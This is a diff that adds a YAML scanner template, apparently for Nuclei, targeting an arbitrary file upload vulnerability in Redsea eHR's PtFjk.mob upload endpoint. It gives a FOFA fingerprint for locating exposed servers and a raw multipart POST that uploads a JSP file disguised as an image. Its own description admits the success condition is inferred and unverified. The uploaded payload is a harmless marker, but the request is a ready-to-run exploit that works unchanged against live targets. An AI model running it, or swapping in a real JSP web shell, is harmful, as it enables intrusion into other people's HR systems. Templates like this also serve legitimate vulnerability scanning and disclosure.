@@ -1,0 +1,41 @@
+id: poc-trpoywox8e4g2m88
+info:
+  name: 红海云eHR-PtFjk.mob存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/trpoywox8e4g2m88
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: trpoywox8e4g2m88
+    fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+http:
+- raw:
+  - 'POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
+
+
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4
+
+    Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
+
+    Content-Type:image/jpeg
+
+
+    <% out.print("hello,eHR");%>
+
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
